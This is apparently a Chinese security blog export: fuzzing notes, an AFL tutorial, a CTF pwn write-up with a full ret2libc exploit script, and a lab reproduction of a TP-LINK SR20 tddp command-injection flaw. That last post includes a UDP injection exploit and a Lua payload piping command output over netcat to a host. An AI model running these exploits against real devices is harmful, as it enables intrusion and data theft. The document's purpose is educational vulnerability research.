作者还提到 白盒测试通常来用来描述污点分析的模糊器笔者查询得知 污点分析中的污点是指不受信任的输入源进入PUT的数据 通常是用户输入通过模糊器生成污点数据 可以模拟潜在的攻击场景 检测PUT是否在处理污点数据的时候存在安全隐患作者提到 由于白盒测试需要进行动态检测和smt求解 所以相比黑盒测试 所需要的开销会更多 Grey-box Fuzzer灰盒测试位于白盒和黑盒之间 模糊器可以获得PUT的一部分内部信息与白盒模糊器相比 灰盒不会推理PUT的完整语义笔者认为 这里的完整语义是指 PUT的内部逻辑 数据流 控制流以及外部的交互等等作者提到 灰盒测试可以对PUT进行轻量的静态分析或者收集其执行的动态信息 比如代码覆盖率 5.Fuzzer Genealogy and Overview暂时看不下去了 断更。。。 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"FUZZ学习","slug":"fuzz学习","date":"2023-10-17T08:37:27.000Z","updated":"2023-11-20T02:59:54.000Z","comments":true,"path":"2023/10/17/fuzz学习/","link":"","permalink":"http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言对于FUZZ的大名早有耳闻 今天终于开始正式学习这一知识水平有限 本篇文章可能部分地方存在描述错误等问题本篇文章使用AFL模糊器 什么是FUZZ为了弄清楚FUZZ的概念 拜读了《Fuzzing: Art, Science, and Engineering》这篇经典的论文 如果有想看我阅读后总结的 可以去看另外一篇博客 这里就简单概述FUZZ相比传统的软件测试 其包含的漏洞预测器用于决定测试过程中是否违反了安全策略二者的目的性不一样 而FUZZ又分为三种 白盒 黑盒 灰盒 三者最大的差别在于模糊器对于PUT(待测程序)的了解程度有多少 是否知晓PUT的内部逻辑等FUZZ采用模糊算法来生成随机的测试样例 部分复杂的模糊配置可以演变种子池来迭代测试样例 通常依靠代码覆盖率(即PUT执行路径) 配置FUZZ环境wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgztar xvf afl-latest.tgzcd afl-2.52bsudo make &amp;&amp; sudo make install 上述是afl的安装 我个人建议是使用afl++ 不过本篇文章均采用afl同时上述方式安装的afl版本是2.52 实际上最新的版本为2.57 需要去github上下载源代码后make编译 这里看各位的需求 第一次FUZZ我们先来自己编写一个程序 逻辑很简单 输入对应的字符串就触发段错误 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; char buf[100]; scanf(&quot;%s&quot;,buf); char buf1[] = &quot;aaaa&quot;; if(!strcmp(buf,buf1))&#123; printf(&quot;success!\\n&quot;); raise(SIGSEGV); &#125;else&#123; printf(&quot;faile\\n&quot;); &#125;&#125; 随便创建两个空目录 一个用来存放测试样例 一个用来存放输出信息本次模糊测试 测试样例由我们自己填写随后使用-i指定前者 -o指定后者 开始fuzz afl-fuzz -i ./fuzz/in -o ./fuzz/out ./test 当然了 如果你使用的是afl 那么你就会发现 模糊器读取到第二个样例的时候就终止了原因在于afl的测试样例貌似不能直接导致PUT触发crash所以这里更改第二个样例 使其为aaa 让模糊器使其迭代 延伸成aaaa这个字符串随后重新开始fuzz 发现成功找到了三个crash 看到官方文档说 如果要让模糊器运行完毕 需要几个小时到一周左右 所以这里直接ctrl+c终止了官方文档提到 crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal. 所以去crashes目录下找到了三个触发崩溃的样例第一个不出所料 是我们原定的字符串aaaa 第二个和第三个有点意外 貌似也是一些无规则字节 打算动调来看看 利用hexdump获取一下16进制格式的ascii字节码 \\x68\\x68\\x68\\x68\\x32\\x00\\x00\\x68\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xCE\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\x68\\x87\\x68\\xE8\\x00\\x10\\x68\\x7F\\xFF\\xF0\\xF0\\xF0\\xF0\\xF0\\xCF\\xF0\\xF0\\xF0\\xE4\\xF0\\xF0\\xF0\\x70\\xF0\\x68\\x68\\x68\\x68\\x32\\x68\\x68\\x68\\x68\\x68\\x68\\xE8\\x68\\x68\\x68\\x68\\xF0\\xF0\\xF0\\xF0\\xF0\\xF0\\xCF\\xF0\\xF0\\xF0\\xF0\\x68\\x68\\xF0\\xE9\\xF0\\xF0\\xFB\\xF0\\xCF\\xF0\\xF0\\xF0\\xF0\\xF0\\xF0\\x07\\x70\\xF0\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x6E\\x00\\x00\\x01\\x00\\x70\\xF0\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\xDF\\xD1 调试exp: from pwn import*io = process(&quot;./test&quot;)elf = ELF(&quot;./test&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]payload = &quot;\\x68\\x68\\x68\\x68\\x32\\x00\\x00\\x68\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xCE\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\xC6\\x68\\x87\\x68\\xE8\\x00\\x10\\x68\\x7F\\xFF\\xF0\\xF0\\xF0\\xF0\\xF0\\xCF\\xF0\\xF0\\xF0\\xE4\\xF0\\xF0\\xF0\\x70\\xF0\\x68\\x68\\x68\\x68\\x32\\x68\\x68\\x68\\x68\\x68\\x68\\xE8\\x68\\x68\\x68\\x68\\xF0\\xF0\\xF0\\xF0\\xF0\\xF0\\xCF\\xF0\\xF0\\xF0\\xF0\\x68\\x68\\xF0\\xE9\\xF0\\xF0\\xFB\\xF0\\xCF\\xF0\\xF0\\xF0\\xF0\\xF0\\xF0\\x07\\x70\\xF0\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x6E\\x00\\x00\\x01\\x00\\x70\\xF0\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\x68\\xDF\\xD1&quot;gdb.attach(io,&#x27;b *$rebase(0x1244)&#x27;)io.sendline(payload)pause() 在程序执行到pthread_kill函数后 回溯一下执行流 发现了检查canary的函数应该是由于栈溢出触发的crash那么接下来来看第三个看这个长度应该也是因为栈溢出导致的crash 那么这里就不进一步动调了 黑盒测试以及读取文件内容本小节用来记录自己对于afl官方文档阅读后的理解和实操 没啥重要性文档中粗略介绍了afl所采用的模糊算法总结一下 可以得到下图大体是和论文中描述的模糊器的五个功能大差不差随后想要研究一下afl的黑盒测试功能 然后在配置环境的时候 不得不说是真的遇到一堆报错首先进入下载的afl源码目录中的qemu-mode目录 运行build_qemu_support.sh cd qemu-mode./build_qemu_support.sh 这里我首先遇到的是下载qemu的网址报错404 但是也不是虚拟机代理问题 我宿主机也访问不到进入build文件中 找到对应代码的位置将QEMU_URL更改为 https://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz 随后就可以正常下载了 接下来遇到的问题是其默认使用的是python 需求是python2所以还需要加一个软连接 使python可以指向python2 sudo ln -s /usr/bin/python2.7 /usr/bin/python 随后虽然可以正常执行一段时间 最后还是遇到了一个报错&#x2F;home&#x2F;chen&#x2F;AFL&#x2F;qemu_mode&#x2F;qemu-2.10.0&#x2F;linux-user&#x2F;syscall.c:261:16: error: static declaration of ‘gettid’ follows non-static declaration找到qemu-mode中的patches目录 更改syscall.diff文件内容为 --- qemu-2.10.0-clean/linux-user/syscall.c 2020-03-12 18:47:47.898592169 +0100+++ qemu-2.10.0/linux-user/syscall.c 2020-03-12 19:16:41.563074307 +0100@@ -34,6 +34,7 @@ #include &lt;sys/resource.h&gt; #include &lt;sys/swap.h&gt; #include &lt;linux/capability.h&gt;+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988 #include &lt;sched.h&gt; #include &lt;sys/timex.h&gt; #ifdef __ia64__@@ -116,6 +117,8 @@ int __clone2(int (*fn)(void *), void *ch #include &quot;qemu.h&quot; +extern unsigned int afl_forksrv_pid;+ #ifndef CLONE_IO #define CLONE_IO 0x80000000 /* Clone io context */ #endif @@ -256,7 +259,9 @@ static type name (type1 arg1,type2 arg2, #endif #ifdef __NR_gettid-_syscall0(int, gettid)+// taken from https://patchwork.kernel.org/patch/10862231/+#define __NR_sys_gettid __NR_gettid+_syscall0(int, sys_gettid) #else /* This is a replacement for the host gettid() and must return a host errno. */@@ -6219,7 +6224,8 @@ static void *clone_func(void *arg) cpu = ENV_GET_CPU(env); thread_cpu = cpu; ts = (TaskState *)cpu-&gt;opaque;- info-&gt;tid = gettid();+ // taken from https://patchwork.kernel.org/patch/10862231/+ info-&gt;tid = sys_gettid(); task_settid(ts); if (info-&gt;child_tidptr) put_user_u32(info-&gt;tid, info-&gt;child_tidptr);@@ -6363,9 +6369,11 @@ static int do_fork(CPUArchState *env, un mapping. We can&#x27;t repeat the spinlock hack used above because the child process gets its own copy of the lock. */ if (flags &amp; CLONE_CHILD_SETTID)- put_user_u32(gettid(), child_tidptr);+ // taken from https://patchwork.kernel.org/patch/10862231/+ put_user_u32(sys_gettid(), child_tidptr); if (flags &amp; CLONE_PARENT_SETTID)- put_user_u32(gettid(), parent_tidptr);+ // taken from https://patchwork.kernel.org/patch/10862231/+ put_user_u32(sys_gettid(), parent_tidptr); ts = (TaskState *)cpu-&gt;opaque; if (flags &amp; CLONE_SETTLS) cpu_set_tls (env, newtls);@@ -11402,7 +11410,8 @@ abi_long do_syscall(void *cpu_env, int n break; #endif case TARGET_NR_gettid:- ret = get_errno(gettid());+ // taken from https://patchwork.kernel.org/patch/10862231/+ ret = get_errno(sys_gettid()); break; #ifdef TARGET_NR_readahead case TARGET_NR_readahead: 随后成功完成环境配置更多报错可以参考该文章: https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&amp;spm=3001.4430但是随后我们尝试使用-Q选项开始模糊测试 但是发现其找不到afl-qemu-trace只需要添加环境变量AFL_PATH为afl目录的路径即可这里还是使用上述的PUT进行测试 不过是用gcc将其编译成功获取到两个crash不出所料 一个应该是canary导致的栈溢出 一个是因为我们既定的字符串触发的crash接下来试着研究了下PUT输入样例的两个方式一种是直接从stdin输入 像本篇文章一直使用的PUT那样还有一种是从文件中输入 那么接下来就重写一个PUT来实现第二种不过我们先来搞清楚第一种官方文档中 记录的指令是这样 ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...] [params]比较让我在意 这是否意味着不需要in目录? 可以直接从命令行输入测试样例删除了in目录中的所有测试样例后 我想通过命令行向其传输aaa这个测试样例结果还是失败了 那么为了验证 命令行输入的测试样例究竟是否起到了作用 接下来做一个小测试第一组我们的测试样例中不包含aaa 同时不通过命令行输入测试样例第二组我们的测试样例保持不变 通过命令行输入测试样例aaa对比两组的测试结果 如果第二组的crash除了栈溢出之外 还变异出了aaa 而第一组没有 那么就可以证明测试样例成功输入进去测试样例两个 内容分别如上图第一组跑出的crash中不含有aaaa第二组含有 那么可以证实测试样例确实是传入了接下来研究一下从文件中写入的 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;int main()&#123; int fd = open(&quot;flag&quot;,0); char buf[0x20]; read(fd,buf,0x20); char buf1[0x20] = &quot;aaaa&quot;; if(!strcmp(buf,buf1))&#123; puts(&quot;success!&quot;); raise(SIGSEGV); &#125;else&#123; puts(&quot;error&quot;); &#125;&#125; 编译命令 这里考虑到了canary带来的crash太讨厌了 所以直接关掉了 afl-gcc -o test1 -no-pie -fno-stack-protector -g ./test1.c 本次提供给模糊器的测试样例就一个aaa然后由于是从文件读取输入 并且你可以看到上面的代码 我们是指定了所需的文件名 同时目录应该是位于当前PUT下所以我们除了使用@@标识当前使用文件输入外 还需要使用-f指定对应路径下的文件名不过我试了下 把@@删了也是可以的 可能是-f就自动默认了? afl-fuzz -i ./fuzz/in -o ./fuzz/out -f ./flag ./test1 @@ 成功找到一个crash查看了内容 没错是我们预设的aaaa fuzz实际利用接下来准备尝试 使用fuzz来对一些开源的知名项目进行测试 以此来熟悉fuzz实际利用的操作这里使用upx upx是一款可执行文件压缩工具 https://github.com/upx/upx#upx使用的压缩算法涉及到了ucl 所以还要先安装ucl mkdir fuzz-upxgit clone https://github.com/upx/upx.gitwget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gztar zxvf ucl-1.03.tar.gzcd ucl-1.03./configure CPPFLAGS=&quot;$CPPFLAGS -std=c90 -fPIC&quot;cd upxexport CC=/usr/local/bin/afl-gcc export CXX=/usr/local/bin/afl-g++export UPX_UCCLDIR=&quot;/home/chen/fuzz-upx/ucl-1.03&quot;export UPX_LZMADIR=&quot;/home/chen/fuzz-upx/upx/vendor/lzma-sdk/&quot;上面这一步要注意一下 upx高版本和低版本的lzma-sdk存放位置不同 我的指令是高版本的make all在.bashrc文件中加上export PATH=$PATH:/home/chen/fuzz-upx/upx/build/releasesource ~/.bashrc 在开始对upx模糊测试之前 我们不能像之前一样随便给几个样本 样本收集对于fuzz来说至关重要 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"2023柏鹭杯","slug":"2023柏鹭杯","date":"2023-10-13T12:07:16.000Z","updated":"2024-09-20T09:16:24.000Z","comments":true,"path":"2023/10/13/2023柏鹭杯/","link":"","permalink":"http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/","excerpt":"","text":"前言算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审 同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题 eval__int64 __fastcall main(int a1, char **a2, char **a3)&#123; char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF char v5[264]; // [rsp+B0h] [rbp-110h] BYREF unsigned __int64 v6; // [rsp+1B8h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); alarm(0x1Eu); while ( recv_data(v5, 0x100uLL) ) vuln(v5, v4); return 0LL;&#125; main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环先跟进一下recv_data这个函数 __int64 __fastcall sub_9D6(void *a1, size_t a2)&#123; __int64 v3; // rax char buf; // [rsp+1Fh] [rbp-11h] BYREF __int64 v6; // [rsp+20h] [rbp-10h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); v6 = 0LL; memset(a1, 0, a2); while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 ) &#123; if ( !check_opt(buf) &amp;&amp; !check_number(buf) ) error(); v3 = v6++; *(a1 + v3) = buf; &#125; return v6;&#125; 通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中随后来看一下vuln函数 int __fastcall vuln(__int64 buf, _QWORD *a2)&#123; char v3; // [rsp+1Fh] [rbp-11h] __int64 buf2; // [rsp+20h] [rbp-10h] __int64 i; // [rsp+28h] [rbp-8h] memset(a2, 0, 0xA0uLL); buf2 = buf; for ( i = 0LL; ; ++i ) &#123; v3 = *(buf + i); if ( !check_opt(v3) ) // 如果不是opt就返回0 即退出for循环 break; deal_number(a2, buf2, i + buf); if ( !check_number(*(i + 1 + buf)) ) error(); sub_CB1(a2, v3); buf2 = i + 1 + buf;LABEL_8: ; &#125; if ( v3 ) goto LABEL_8; deal_number(a2, buf2, i + buf); while ( *a2 ) calc(a2); return printf(&quot;%ld\\n&quot;, a2[a2[3] + 3]);&#125; 这里的逻辑稍微复杂一点仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数来跟进一下deal_number函数 _BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)&#123; _BYTE *result; // rax __int64 v4; // rax __int64 v5; // rcx char old_opt; // [rsp+27h] [rbp-9h] _BYTE *first_number; // [rsp+28h] [rbp-8h] if ( *buf2 == &#x27;0&#x27; ) error(); old_opt = *opt; *opt = 0; first_number = strtol(buf2, 0LL, 10); result = opt; *opt = old_opt; if ( first_number ) &#123; v4 = *(a1 + 24); *(a1 + 24) = v4 + 1; v5 = v4 + 4; result = first_number; *(a1 + 8 * v5) = first_number; &#125; return result;&#125; 先判断了是否为0 是则终止程序随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了 所以数字存储的地址也会相应增加一个字长sub_cb1函数是一个对于运算符的检查以及筛分后运算 __int64 __fastcall sub_CB1(_QWORD *a1, char opt)&#123; __int64 result; // rax if ( !*a1 ) &#123; result = (*a1)++; *(a1 + result + 8) = opt; return result; &#125; if ( opt != &#x27;+&#x27; ) &#123; if ( opt &lt;= &#x27;+&#x27; ) &#123; if ( opt != &#x27;*&#x27; ) // 这边是*的跳转LABEL_16: error(); goto LABEL_8; &#125; if ( opt != &#x27;-&#x27; ) &#123; if ( opt != &#x27;/&#x27; ) goto LABEL_16;LABEL_8: if ( sub_91A(*(a1 + *a1 + 7)) ) // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/ calc(a1); if ( *a1 &gt; 0xEuLL ) error(); result = (*a1)++; *(a1 + result + 8) = opt; return result; &#125; &#125; calc(a1); if ( *a1 &gt; 0xEuLL ) error(); result = (*a1)++; *(a1 + result + 8) = opt; return result;&#125; 随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析 _QWORD *__fastcall sub_AC7(_QWORD *a1)&#123; _QWORD *result; // rax int opt; // eax result = *a1; if ( *a1 ) &#123; opt = *(a1 + --*a1 + 8); if ( opt == &#x27;+&#x27; ) &#123; a1[a1[3] + 2] += a1[a1[3] + 3]; // a1[a1[3] + 2]为第一个number &#125; else if ( opt &gt; &#x27;+&#x27; ) &#123; if ( opt == &#x27;-&#x27; ) &#123; a1[a1[3] + 2] -= a1[a1[3] + 3]; &#125; else &#123; if ( opt != &#x27;/&#x27; )LABEL_15: error(); if ( !a1[a1[3] + 3] ) error(); a1[a1[3] + 2] /= a1[a1[3] + 3]; &#125; &#125; else &#123; if ( opt != &#x27;*&#x27; ) goto LABEL_15; a1[a1[3] + 2] *= a1[a1[3] + 3]; &#125; result = a1; --a1[3]; &#125; return result;&#125; 经过上面的分析 我们大概可以推理出这样一个大概的流程比如 输入1+2首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中此时i自增1 也就是判断下一个字符 即++可以通过判断 此时第一次执行deal_number函数而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32随后检查下一个字符是否为数字 如果不是则终止程序同时更改了buf2 使其指向2数字位于的地址随后就因为第四个字节为空 此时就算真正跳出了for循环此时再次执行deal_number 也就是对于第二个数字进行存储随后进入calc函数执行操作这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点但是如果我们输入的是+52会怎么样其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了随后只会存储52这个数字到a2+32的位置随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53而最后的printf语句就是根据a2[3]来索引的 printf(&quot;%ld\\n&quot;, a2[a2[3] + 3]) 所以漏洞就出现在这里 可以实现一个栈上内容的泄露泄露出libc_start_main的地址在得到了libc地址后 我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;121.12.85.23&quot;,50532)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause() payload = &quot;+52&quot;io.sendline(payload)libc.address = int(io.recvuntil(&quot;\\n&quot;,drop = True),10)-0x24083success(&quot;libc_addr :&quot;+hex(libc.address)) system_addr = libc.sym[&#x27;system&#x27;]payload = &quot;+54+&quot;+str(system_addr)io.sendline(payload) binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))payload = &quot;+53+&quot;+str(binsh_addr)io.sendline(payload) rdi_addr = libc.address + 0x0000000000023b6apayload = &quot;+52+&quot;+str(rdi_addr)io.sendline(payload) ret_addr = rdi_addr+1payload = &quot;+51+&quot;+str(ret_addr)io.sendline(payload) payload = &quot;&quot;# gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)io.sendline(payload)# pause()io.interactive()if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"TP-LINK SR20漏洞复现","slug":"tp-link-sr20漏洞复现","date":"2023-10-08T08:50:13.000Z","updated":"2023-10-12T15:41:42.000Z","comments":true,"path":"2023/10/08/tp-link-sr20漏洞复现/","link":"","permalink":"http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前言一个涉及到了通信协议的洞 还是比较有趣的 以此来顺便丰富一下对于协议洞的认知固件下载地址: https://www.tp-link.com/us/support/download/sr20/#Firmware 漏洞分析本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件是32位的arm架构ida打开后没有找到main函数 通过start函数来索引到main函数 int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // r3 int v4; // r0 int v6; // [sp+Ch] [bp-8h] int v7; // [sp+Ch] [bp-8h] v6 = mem_calloc(argc, argv, envp); if ( v6 ) return v6; v4 = sub_936C(); v7 = delete_mem(v4); if ( v7 ) v3 = v7; else v3 = 0; return v3;&#125; 主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间重点跟进一下936c这个函数 int sub_936C()&#123; _DWORD *v0; // r4 int optval; // [sp+Ch] [bp-B0h] BYREF int v3; // [sp+10h] [bp-ACh] BYREF struct timeval timeout; // [sp+14h] [bp-A8h] BYREF fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF int v7; // [sp+A0h] [bp-1Ch] int nfds; // [sp+A4h] [bp-18h] fd_set *v9; // [sp+A8h] [bp-14h] unsigned int i; // [sp+ACh] [bp-10h] v6 = 0; v3 = 1; optval = 1; printf(&quot;[%s():%d] tddp task start\\n&quot;, &quot;tddp_taskEntry&quot;, 151); if ( !sub_16ACC(&amp;v6) &amp;&amp; !sub_16E5C(v6 + 9) &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u) &amp;&amp; !sub_16D68(v6[9], 1040) // 绑定1040端口 &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) ) &#123; v6[11] |= 2u; v6[11] |= 4u; v6[11] |= 8u; v6[11] |= 0x10u; v6[11] |= 0x20u; v6[11] |= 0x1000u; v6[11] |= 0x2000u; v6[11] |= 0x4000u; v6[11] |= 0x8000u; v6[12] = 60; v0 = v6; v0[13] = sub_9340(); // 获取时间 v9 = &amp;readfds; for ( i = 0; i &lt;= 0x1F; ++i ) v9-&gt;__fds_bits[i] = 0; nfds = v6[9] + 1; while ( 1 ) &#123; do &#123; timeout.tv_sec = 600; timeout.tv_usec = 0; readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F); v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout); if ( sub_9340() - v6[13] &gt; v6[12] ) v6[8] = 0; &#125; while ( v7 == -1 ); if ( !v7 ) break; if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 ) sub_16418(v6); &#125; &#125; sub_16E0C(v6[9]); sub_16C18(v6); return printf(&quot;[%s():%d] tddp task exit\\n&quot;, &quot;tddp_taskEntry&quot;, 219);&#125; 用socket来实现通讯sub_16D68函数中 绑定了1040端口 int __fastcall sub_16D68(int a1, uint16_t a2)&#123; int v2; // r3 struct sockaddr s; // [sp+8h] [bp-14h] BYREF memset(&amp;s, 0, sizeof(s)); s.sa_family = 2; *&amp;s.sa_data[2] = htonl(0); *s.sa_data = htons(a2); if ( bind(a1, &amp;s, 0x10u) == -1 ) v2 = sub_13018(-10103, &quot;failed to bind socket&quot;); else v2 = 0; return v2;&#125; 同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯随后会进入sub_16418函数该函数旨在接收1040端口传输来的数据这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址对于v2进行了一个检测 如果为1则进入分支这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议分为v1和v2两个版本版本号会放在数据包首地址来作为区分随后还会有一个用来表示类型的字段 4：CMD_AUTO_TEST 6: CMD_CONFIG_MAC 7: CMD_CANCEL_TEST8: CMD_REBOOT_FOR_TEST 0XA:CMD_GET_PROD_ID 0XC: CMD_SYS_INIT 0XD: CMD_CONFIG_PIN 0X30: CMD_FTEST_USB 0X31: CMD_FTEST_CONFIG 也就是我们在sub_15E74函数中所看到的这里借用winmt师傅的图来方便理解包的形式ver为版本号 type则为包的类型本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的上述为第一种漏洞的利用途径 接下来还有一个通过lua脚本达到任意命令执行的洞可以看到 s是由我们所控制的 其作为一个路径的一部分 用来指向一个lua脚本并且如果这个lua脚本存在 就可以执行这个脚本我们再来看一下原本要执行的指令其为 tftp -gr xxxx hosthost为宿主机与虚拟机通信的接口ip我们只需要在宿主机启动tftp服务 随后篡改xxxx为正确的文件名 就可以实现任意脚本执行了 环境搭建使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持搭建脚本: #!/bin/bash sudo tunctl -t tap1 -u root sudo ifconfig tap1 192.168.6.2 sudo qemu-system-arm \\ -M vexpress-a9 \\ -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \\ -initrd ./armhf/initrd.img-3.2.0-4-vexpress \\ -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \\ -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \\ -net nic -net tap,ifname=tap1,script=no,downscript=no \\ -nographic 我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题所以这里按照描述更改映像文件为32G即可 qemu-img resize debian_wheezy_armhf_standard.qcow2 32G 随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段随后挂载两个文件夹并且设置squashfs-root为根目录 mount -o bind /dev ./squashfs-root/dev/mount -t proc /proc/ ./squashfs-root/proc/chroot ./squashfs-root/ sh 启动tddp程序接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的我们需要借助nmap的udp扫描方式可以看到这个端口是有过滤的等下使用脚本复现的时候也要注意一下socket需要调整为UDP随后在宿主机上安装tftp sudo apt install atftpd 随后需要进行两次配置 sudo vim /etc/xinetd.d/tftpservice tftp &#123; socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /tftpboot -c 这个文件夹我试过放到用户目录下 最后失败了disable = no per_source = 11 cps = 100 2 flags = IPv4 &#125; sudo vim /etc/default/atftpdUSE_INETD=false# OPTIONS below are used only with init scriptOPTIONS=&quot;--tftpd-timeout 0 --retry-timeout 0 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot; 随后更改tftpboot文件夹的权限以及新增一个payload文件 用来执行命令 chmod 777 /tftpboottouch payloadsudo vim payloadfunction config_test(config) os.execute(&quot;id|nc 192.168.6.2 6666&quot;)end 漏洞复现在虚拟机启动tddp后 使用脚本 from socket import*from sys import* s = socket(AF_INET,SOCK_DGRAM)s.connect((&quot;192.168.6.3&quot;,1040)) payload = b&quot;\\x01\\x31&quot; #版本号和类型payload = payload.ljust(12,b&#x27;\\x00&#x27;) #填充垃圾数据payload += b&quot;|touch a||;aaa&quot;s.sendall(payload) 随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 